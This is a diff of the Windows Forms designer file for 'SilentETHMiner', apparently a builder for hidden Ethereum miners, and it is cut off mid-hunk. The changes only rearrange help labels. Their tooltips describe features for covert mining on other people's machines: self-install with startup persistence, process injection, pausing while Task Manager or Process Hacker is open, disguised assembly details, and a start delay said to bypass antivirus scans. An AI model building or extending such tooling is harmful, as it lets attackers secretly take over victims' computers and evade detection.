@@ -27,30 +27,17 @@ Partial Class Form1
         Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
         Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
         Me.TooltipHelper = New System.Windows.Forms.ToolTip(Me.components)
-        Me.Label13 = New System.Windows.Forms.Label()
-        Me.helpLabelPassword = New System.Windows.Forms.Label()
-        Me.Label10 = New System.Windows.Forms.Label()
-        Me.helpLabelPool = New System.Windows.Forms.Label()
-        Me.helpLabelWallet = New System.Windows.Forms.Label()
-        Me.Label4 = New System.Windows.Forms.Label()
-        Me.Label36 = New System.Windows.Forms.Label()
-        Me.Label32 = New System.Windows.Forms.Label()
-        Me.Label31 = New System.Windows.Forms.Label()
-        Me.helpLabelInstall = New System.Windows.Forms.Label()
-        Me.Label35 = New System.Windows.Forms.Label()
-        Me.Label26 = New System.Windows.Forms.Label()
-        Me.Label25 = New System.Windows.Forms.Label()
-        Me.Label19 = New System.Windows.Forms.Label()
-        Me.Label15 = New System.Windows.Forms.Label()
-        Me.Label28 = New System.Windows.Forms.Label()
         Me.MephForm1 = New SilentETHMiner.MephTheme()
         Me.MephTabcontrol2 = New SilentETHMiner.MephTabcontrol()
         Me.TabPage1 = New System.Windows.Forms.TabPage()
         Me.MephGroupBox2 = New SilentETHMiner.MephGroupBox()
         Me.Label14 = New System.Windows.Forms.Label()
+        Me.Label13 = New System.Windows.Forms.Label()
         Me.txtPoolPassowrd = New SilentETHMiner.MephTextBox()
         Me.Label7 = New System.Windows.Forms.Label()
         Me.txtPoolWorker = New SilentETHMiner.MephTextBox()
+        Me.helpLabelPassword = New System.Windows.Forms.Label()
+        Me.Label10 = New System.Windows.Forms.Label()
         Me.txtPoolData = New SilentETHMiner.MephTextBox()
         Me.Label12 = New System.Windows.Forms.Label()
         Me.MephGroupBox1 = New SilentETHMiner.MephGroupBox()
@@ -58,17 +45,25 @@ Partial Class Form1
         Me.Label6 = New System.Windows.Forms.Label()
         Me.txtPoolUsername = New SilentETHMiner.MephTextBox()
         Me.Label8 = New System.Windows.Forms.Label()
+        Me.helpLabelPool = New System.Windows.Forms.Label()
+        Me.helpLabelWallet = New System.Windows.Forms.Label()
         Me.txtPoolScheme = New SilentETHMiner.MephComboBox()
+        Me.Label4 = New System.Windows.Forms.Label()
         Me.Label3 = New System.Windows.Forms.Label()
         Me.TabPage2 = New System.Windows.Forms.TabPage()
+        Me.Label36 = New System.Windows.Forms.Label()
         Me.Label37 = New System.Windows.Forms.Label()
         Me.toggleWatchdog = New SilentETHMiner.MephToggleSwitch()
+        Me.Label32 = New System.Windows.Forms.Label()
+        Me.Label31 = New System.Windows.Forms.Label()
+        Me.helpLabelInstall = New System.Windows.Forms.Label()
         Me.chkInstall = New SilentETHMiner.MephCheckBox()
         Me.txtInstallFileName = New SilentETHMiner.MephTextBox()
         Me.Label2 = New System.Windows.Forms.Label()
         Me.Label1 = New System.Windows.Forms.Label()
         Me.txtInstallPathMain = New SilentETHMiner.MephComboBox()
         Me.TabPage3 = New System.Windows.Forms.TabPage()
+        Me.Label35 = New System.Windows.Forms.Label()
         Me.Label9 = New System.Windows.Forms.Label()
         Me.chkAssembly = New SilentETHMiner.MephCheckBox()
         Me.btn_assemblyRandom = New SilentETHMiner.MephButton()
@@ -91,17 +86,22 @@ Partial Class Form1
         Me.TabPage6 = New System.Windows.Forms.TabPage()
         Me.Label5 = New System.Windows.Forms.Label()
         Me.txtInjection = New SilentETHMiner.MephComboBox()
+        Me.Label26 = New System.Windows.Forms.Label()
         Me.Label27 = New System.Windows.Forms.Label()
         Me.toggleEnableStealth = New SilentETHMiner.MephToggleSwitch()
+        Me.Label25 = New System.Windows.Forms.Label()
         Me.Label24 = New System.Windows.Forms.Label()
         Me.Label23 = New System.Windows.Forms.Label()
         Me.txtIdleWait = New SilentETHMiner.MephTextBox()
         Me.Label20 = New System.Windows.Forms.Label()
+        Me.Label19 = New System.Windows.Forms.Label()
         Me.chkAdvanced = New SilentETHMiner.MephCheckBox()
         Me.txtAdvParam = New SilentETHMiner.MephTextBox()
+        Me.Label15 = New System.Windows.Forms.Label()
         Me.Label11 = New System.Windows.Forms.Label()
         Me.toggleEnableIdle = New SilentETHMiner.MephToggleSwitch()
         Me.TabPage5 = New System.Windows.Forms.TabPage()
+        Me.Label28 = New System.Windows.Forms.Label()
         Me.Label29 = New System.Windows.Forms.Label()
         Me.Label30 = New System.Windows.Forms.Label()
         Me.txtStartDelay = New SilentETHMiner.MephTextBox()
@@ -136,244 +136,6 @@ Partial Class Form1
         Me.TooltipHelper.InitialDelay = 100
         Me.TooltipHelper.IsBalloon = True
         Me.TooltipHelper.ReshowDelay = 100
-        '
-        'Label13
-        '
-        Me.Label13.AutoSize = True
-        Me.Label13.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label13.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label13.ForeColor = System.Drawing.Color.Teal
-        Me.Label13.Location = New System.Drawing.Point(267, 58)
-        Me.Label13.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label13.Name = "Label13"
-        Me.Label13.Size = New System.Drawing.Size(18, 20)
-        Me.Label13.TabIndex = 48
-        Me.Label13.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label13, "The worker name to mine with. You can also enter {%RANDOM%} to randomize a new nu" &
-        "mber every startup or enter {%COMPUTERNAME%} to get the computer name.")
-        '
-        'helpLabelPassword
-        '
-        Me.helpLabelPassword.AutoSize = True
-        Me.helpLabelPassword.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelPassword.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelPassword.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelPassword.Location = New System.Drawing.Point(268, 129)
-        Me.helpLabelPassword.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.helpLabelPassword.Name = "helpLabelPassword"
-        Me.helpLabelPassword.Size = New System.Drawing.Size(18, 20)
-        Me.helpLabelPassword.TabIndex = 39
-        Me.helpLabelPassword.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelPassword, "The password to connect with. On many pools you should leave this blank but on so" &
-        "me they require you to use some password.")
-        '
-        'Label10
-        '
-        Me.Label10.AutoSize = True
-        Me.Label10.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label10.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label10.ForeColor = System.Drawing.Color.Teal
-        Me.Label10.Location = New System.Drawing.Point(268, 200)
-        Me.Label10.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label10.Name = "Label10"
-        Me.Label10.Size = New System.Drawing.Size(18, 20)
-        Me.Label10.TabIndex = 45
-        Me.Label10.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label10, "Extra data to send to the pool, separate the data with a '/' like so: data1/data2" &
-        "/data3. An example could be WorkerName/email@test.com on some pools.")
-        '
-        'helpLabelPool
-        '
-        Me.helpLabelPool.AutoSize = True
-        Me.helpLabelPool.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelPool.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelPool.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelPool.Location = New System.Drawing.Point(261, 129)
-        Me.helpLabelPool.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.helpLabelPool.Name = "helpLabelPool"
-        Me.helpLabelPool.Size = New System.Drawing.Size(18, 20)
-        Me.helpLabelPool.TabIndex = 37
-        Me.helpLabelPool.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelPool, "The pool to mine to. Pool address is formatted as such: ADDRESS:PORT. (Example: e" &
-        "th.examplepool.com:8080)")
-        '
-        'helpLabelWallet
-        '
-        Me.helpLabelWallet.AutoSize = True
-        Me.helpLabelWallet.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelWallet.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelWallet.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelWallet.Location = New System.Drawing.Point(261, 200)
-        Me.helpLabelWallet.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.helpLabelWallet.Name = "helpLabelWallet"
-        Me.helpLabelWallet.Size = New System.Drawing.Size(18, 20)
-        Me.helpLabelWallet.TabIndex = 38
-        Me.helpLabelWallet.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelWallet, "The Ethereum wallet address to mine to. Required on most pools but for some pools" &
-        " that use a username or email you should leave this blank and enter the username" &
-        "/email into the 'Extra data' field.")
-        '
-        'Label4
-        '
-        Me.Label4.AutoSize = True
-        Me.Label4.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label4.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label4.ForeColor = System.Drawing.Color.Teal
-        Me.Label4.Location = New System.Drawing.Point(261, 57)
-        Me.Label4.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label4.Name = "Label4"
-        Me.Label4.Size = New System.Drawing.Size(18, 20)
-        Me.Label4.TabIndex = 42
-        Me.Label4.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label4, "The connection scheme to use, check your pool for what to use. Select 'stratum' f" &
-        "or the normal stratum ports, 'stratums' for the SSL/TLS port and 'stratumss' for" &
-        " the 1.2 SSL/TLS ports.")
-        '
-        'Label36
-        '
-        Me.Label36.AutoSize = True
-        Me.Label36.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label36.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label36.ForeColor = System.Drawing.Color.Teal
-        Me.Label36.Location = New System.Drawing.Point(202, 175)
-        Me.Label36.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label36.Name = "Label36"
-        Me.Label36.Size = New System.Drawing.Size(18, 20)
-        Me.Label36.TabIndex = 46
-        Me.Label36.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label36, resources.GetString("Label36.ToolTip"))
-        '
-        'Label32
-        '
-        Me.Label32.AutoSize = True
-        Me.Label32.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label32.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label32.ForeColor = System.Drawing.Color.Teal
-        Me.Label32.Location = New System.Drawing.Point(318, 125)
-        Me.Label32.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label32.Name = "Label32"
-        Me.Label32.Size = New System.Drawing.Size(18, 20)
-        Me.Label32.TabIndex = 40
-        Me.Label32.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners filename, this filename will show up in places like the Task" &
-        " Manager autostart window.")
-        '
-        'Label31
-        '
-        Me.Label31.AutoSize = True
-        Me.Label31.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label31.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label31.ForeColor = System.Drawing.Color.Teal
-        Me.Label31.Location = New System.Drawing.Point(316, 72)
-        Me.Label31.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label31.Name = "Label31"
-        Me.Label31.Size = New System.Drawing.Size(18, 20)
-        Me.Label31.TabIndex = 39
-        Me.Label31.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label31, "The location to save the Installed miner.")
-        '
-        'helpLabelInstall
-        '
-        Me.helpLabelInstall.AutoSize = True
-        Me.helpLabelInstall.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelInstall.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelInstall.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelInstall.Location = New System.Drawing.Point(152, 25)
-        Me.helpLabelInstall.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.helpLabelInstall.Name = "helpLabelInstall"
-        Me.helpLabelInstall.Size = New System.Drawing.Size(18, 20)
-        Me.helpLabelInstall.TabIndex = 38
-        Me.helpLabelInstall.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelInstall, "Enabling Install causes the miner to copy itself to the Save Path and then set to" &
-        " run on startup. This should probably be enabled unless you are just testing.")
-        '
-        'Label35
-        '
-        Me.Label35.AutoSize = True
-        Me.Label35.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label35.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label35.ForeColor = System.Drawing.Color.Teal
-        Me.Label35.Location = New System.Drawing.Point(152, 25)
-        Me.Label35.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label35.Name = "Label35"
-        Me.Label35.Size = New System.Drawing.Size(18, 20)
-        Me.Label35.TabIndex = 39
-        Me.Label35.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label35, "The assembly information of the file, this information will also show up in the T" &
-        "ask Manager and its autostart section if you have ""Install"" enabled.")
-        '
-        'Label26
-        '
-        Me.Label26.AutoSize = True
-        Me.Label26.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label26.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label26.ForeColor = System.Drawing.Color.Teal
-        Me.Label26.Location = New System.Drawing.Point(264, 78)
-        Me.Label26.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label26.Name = "Label26"
-        Me.Label26.Size = New System.Drawing.Size(18, 20)
-        Me.Label26.TabIndex = 57
-        Me.Label26.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label26, "If enabled it will currently pause the miner while Task Manager, Process Explorer" &
-        " or Process Hacker is open.")
-        '
-        'Label25
-        '
-        Me.Label25.AutoSize = True
-        Me.Label25.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label25.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label25.ForeColor = System.Drawing.Color.Teal
-        Me.Label25.Location = New System.Drawing.Point(608, 22)
-        Me.Label25.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label25.Name = "Label25"
-        Me.Label25.Size = New System.Drawing.Size(18, 20)
-        Me.Label25.TabIndex = 54
-        Me.Label25.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label25, "The amount of minutes to wait before starting Idle mode.")
-        '
-        'Label19
-        '
-        Me.Label19.AutoSize = True
-        Me.Label19.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label19.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label19.ForeColor = System.Drawing.Color.Teal
-        Me.Label19.Location = New System.Drawing.Point(530, 165)
-        Me.Label19.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label19.Name = "Label19"
-        Me.Label19.Size = New System.Drawing.Size(18, 20)
-        Me.Label19.TabIndex = 46
-        Me.Label19.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label19, "The parameters to mine with. ONLY CHANGE THESE IF YOU KNOW WHAT YOU ARE DOING.")
-        '
-        'Label15
-        '
-        Me.Label15.AutoSize = True
-        Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label15.ForeColor = System.Drawing.Color.Teal
-        Me.Label15.Location = New System.Drawing.Point(262, 26)
-        Me.Label15.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label15.Name = "Label15"
-        Me.Label15.Size = New System.Drawing.Size(18, 20)
-        Me.Label15.TabIndex = 39
-        Me.Label15.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label15, "If enabled the miner will pause when the computer is active and resume when no ke" &
-        "yboard and mouse input has been detected for the ""Idle Wait"" amount of minutes.")
-        '
-        'Label28
-        '
-        Me.Label28.AutoSize = True
-        Me.Label28.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label28.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label28.ForeColor = System.Drawing.Color.Teal
-        Me.Label28.Location = New System.Drawing.Point(267, 20)
-        Me.Label28.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
-        Me.Label28.Name = "Label28"
-        Me.Label28.Size = New System.Drawing.Size(18, 20)
-        Me.Label28.TabIndex = 58
-        Me.Label28.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" &
-        "virus scans!")
         '
         'MephForm1
         '
@@ -453,6 +215,21 @@ Partial Class Form1
         Me.Label14.TabIndex = 47
         Me.Label14.Text = "Worker Name:"
         '
+        'Label13
+        '
+        Me.Label13.AutoSize = True
+        Me.Label13.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label13.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label13.ForeColor = System.Drawing.Color.Teal
+        Me.Label13.Location = New System.Drawing.Point(267, 58)
+        Me.Label13.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label13.Name = "Label13"
+        Me.Label13.Size = New System.Drawing.Size(18, 20)
+        Me.Label13.TabIndex = 48
+        Me.Label13.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label13, "The worker name to mine with. You can also enter {%RANDOM%} to randomize a new nu" &
+        "mber every startup or enter {%COMPUTERNAME%} to get the computer name.")
+        '
         'txtPoolPassowrd
         '
         Me.txtPoolPassowrd.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
@@ -489,6 +266,36 @@ Partial Class Form1
         Me.txtPoolWorker.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
         Me.txtPoolWorker.UseSystemPasswordChar = False
         Me.txtPoolWorker.WordWrap = False
+        '
+        'helpLabelPassword
+        '
+        Me.helpLabelPassword.AutoSize = True
+        Me.helpLabelPassword.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelPassword.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelPassword.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelPassword.Location = New System.Drawing.Point(268, 129)
+        Me.helpLabelPassword.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.helpLabelPassword.Name = "helpLabelPassword"
+        Me.helpLabelPassword.Size = New System.Drawing.Size(18, 20)
+        Me.helpLabelPassword.TabIndex = 39
+        Me.helpLabelPassword.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelPassword, "The password to connect with. On many pools you should leave this blank but on so" &
+        "me they require you to use some password.")
+        '
+        'Label10
+        '
+        Me.Label10.AutoSize = True
+        Me.Label10.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label10.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label10.ForeColor = System.Drawing.Color.Teal
+        Me.Label10.Location = New System.Drawing.Point(268, 200)
+        Me.Label10.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label10.Name = "Label10"
+        Me.Label10.Size = New System.Drawing.Size(18, 20)
+        Me.Label10.TabIndex = 45
+        Me.Label10.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label10, "Extra data to send to the pool, separate the data with a '/' like so: data1/data2" &
+        "/data3. An example could be WorkerName/email@test.com on some pools.")
         '
         'txtPoolData
         '
@@ -580,6 +387,37 @@ Partial Class Form1
         Me.Label8.TabIndex = 15
         Me.Label8.Text = "Pool:"
         '
+        'helpLabelPool
+        '
+        Me.helpLabelPool.AutoSize = True
+        Me.helpLabelPool.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelPool.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelPool.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelPool.Location = New System.Drawing.Point(261, 129)
+        Me.helpLabelPool.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.helpLabelPool.Name = "helpLabelPool"
+        Me.helpLabelPool.Size = New System.Drawing.Size(18, 20)
+        Me.helpLabelPool.TabIndex = 37
+        Me.helpLabelPool.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelPool, "The pool to mine to. Pool address is formatted as such: ADDRESS:PORT. (Example: e" &
+        "th.examplepool.com:8080)")
+        '
+        'helpLabelWallet
+        '
+        Me.helpLabelWallet.AutoSize = True
+        Me.helpLabelWallet.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelWallet.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelWallet.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelWallet.Location = New System.Drawing.Point(261, 200)
+        Me.helpLabelWallet.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.helpLabelWallet.Name = "helpLabelWallet"
+        Me.helpLabelWallet.Size = New System.Drawing.Size(18, 20)
+        Me.helpLabelWallet.TabIndex = 38
+        Me.helpLabelWallet.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelWallet, "The Ethereum wallet address to mine to. Required on most pools but for some pools" &
+        " that use a username or email you should leave this blank and enter the username" &
+        "/email into the 'Extra data' field.")
+        '
         'txtPoolScheme
         '
         Me.txtPoolScheme.BackColor = System.Drawing.Color.Transparent
@@ -596,6 +434,22 @@ Partial Class Form1
         Me.txtPoolScheme.Size = New System.Drawing.Size(266, 22)
         Me.txtPoolScheme.StartIndex = 0
         Me.txtPoolScheme.TabIndex = 40
+        '
+        'Label4
+        '
+        Me.Label4.AutoSize = True
+        Me.Label4.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label4.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label4.ForeColor = System.Drawing.Color.Teal
+        Me.Label4.Location = New System.Drawing.Point(261, 57)
+        Me.Label4.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label4.Name = "Label4"
+        Me.Label4.Size = New System.Drawing.Size(18, 20)
+        Me.Label4.TabIndex = 42
+        Me.Label4.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label4, "The connection scheme to use, check your pool for what to use. Select 'stratum' f" &
+        "or the normal stratum ports, 'stratums' for the SSL/TLS port and 'stratumss' for" &
+        " the 1.2 SSL/TLS ports.")
         '
         'Label3
         '
@@ -627,6 +481,20 @@ Partial Class Form1
         Me.TabPage2.TabIndex = 1
         Me.TabPage2.Text = "Install"
         '
+        'Label36
+        '
+        Me.Label36.AutoSize = True
+        Me.Label36.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label36.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label36.ForeColor = System.Drawing.Color.Teal
+        Me.Label36.Location = New System.Drawing.Point(202, 175)
+        Me.Label36.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label36.Name = "Label36"
+        Me.Label36.Size = New System.Drawing.Size(18, 20)
+        Me.Label36.TabIndex = 46
+        Me.Label36.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label36, resources.GetString("Label36.ToolTip"))
+        '
         'Label37
         '
         Me.Label37.AutoSize = True
@@ -647,6 +515,50 @@ Partial Class Form1
         Me.toggleWatchdog.Size = New System.Drawing.Size(50, 24)
         Me.toggleWatchdog.TabIndex = 44
         Me.toggleWatchdog.Text = "Enable GPU Mining"
+        '
+        'Label32
+        '
+        Me.Label32.AutoSize = True
+        Me.Label32.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label32.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label32.ForeColor = System.Drawing.Color.Teal
+        Me.Label32.Location = New System.Drawing.Point(318, 125)
+        Me.Label32.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label32.Name = "Label32"
+        Me.Label32.Size = New System.Drawing.Size(18, 20)
+        Me.Label32.TabIndex = 40
+        Me.Label32.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners filename, this filename will show up in places like the Task" &
+        " Manager autostart window.")
+        '
+        'Label31
+        '
+        Me.Label31.AutoSize = True
+        Me.Label31.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label31.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label31.ForeColor = System.Drawing.Color.Teal
+        Me.Label31.Location = New System.Drawing.Point(316, 72)
+        Me.Label31.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label31.Name = "Label31"
+        Me.Label31.Size = New System.Drawing.Size(18, 20)
+        Me.Label31.TabIndex = 39
+        Me.Label31.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label31, "The location to save the Installed miner.")
+        '
+        'helpLabelInstall
+        '
+        Me.helpLabelInstall.AutoSize = True
+        Me.helpLabelInstall.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelInstall.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelInstall.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelInstall.Location = New System.Drawing.Point(152, 25)
+        Me.helpLabelInstall.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.helpLabelInstall.Name = "helpLabelInstall"
+        Me.helpLabelInstall.Size = New System.Drawing.Size(18, 20)
+        Me.helpLabelInstall.TabIndex = 38
+        Me.helpLabelInstall.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelInstall, "Enabling Install causes the miner to copy itself to the Save Path and then set to" &
+        " run on startup. This should probably be enabled unless you are just testing.")
         '
         'chkInstall
         '
@@ -737,6 +649,21 @@ Partial Class Form1
         Me.TabPage3.Size = New System.Drawing.Size(673, 295)
         Me.TabPage3.TabIndex = 2
         Me.TabPage3.Text = "Assembly"
+        '
+        'Label35
+        '
+        Me.Label35.AutoSize = True
+        Me.Label35.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label35.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label35.ForeColor = System.Drawing.Color.Teal
+        Me.Label35.Location = New System.Drawing.Point(152, 25)
+        Me.Label35.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label35.Name = "Label35"
+        Me.Label35.Size = New System.Drawing.Size(18, 20)
+        Me.Label35.TabIndex = 39
+        Me.Label35.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label35, "The assembly information of the file, this information will also show up in the T" &
+        "ask Manager and its autostart section if you have ""Install"" enabled.")
         '
         'Label9
         '
@@ -1061,6 +988,21 @@ Partial Class Form1
         Me.txtInjection.StartIndex = 0
         Me.txtInjection.TabIndex = 58
         '
+        'Label26
+        '
+        Me.Label26.AutoSize = True
+        Me.Label26.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label26.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label26.ForeColor = System.Drawing.Color.Teal
+        Me.Label26.Location = New System.Drawing.Point(264, 78)
+        Me.Label26.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label26.Name = "Label26"
+        Me.Label26.Size = New System.Drawing.Size(18, 20)
+        Me.Label26.TabIndex = 57
+        Me.Label26.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label26, "If enabled it will currently pause the miner while Task Manager, Process Explorer" &
+        " or Process Hacker is open.")
+        '
         'Label27
         '
         Me.Label27.AutoSize = True
@@ -1081,6 +1023,20 @@ Partial Class Form1
         Me.toggleEnableStealth.Size = New System.Drawing.Size(50, 24)
         Me.toggleEnableStealth.TabIndex = 55
         Me.toggleEnableStealth.Text = "Enable Nicehash Mining"
+        '
+        'Label25
+        '
+        Me.Label25.AutoSize = True
+        Me.Label25.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label25.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label25.ForeColor = System.Drawing.Color.Teal
+        Me.Label25.Location = New System.Drawing.Point(608, 22)
+        Me.Label25.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label25.Name = "Label25"
+        Me.Label25.Size = New System.Drawing.Size(18, 20)
+        Me.Label25.TabIndex = 54
+        Me.Label25.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label25, "The amount of minutes to wait before starting Idle mode.")
         '
         'Label24
         '
@@ -1129,6 +1085,20 @@ Partial Class Form1
         Me.Label20.TabIndex = 47
         Me.Label20.Text = "Advanced Parameters:"
         '
+        'Label19
+        '
+        Me.Label19.AutoSize = True
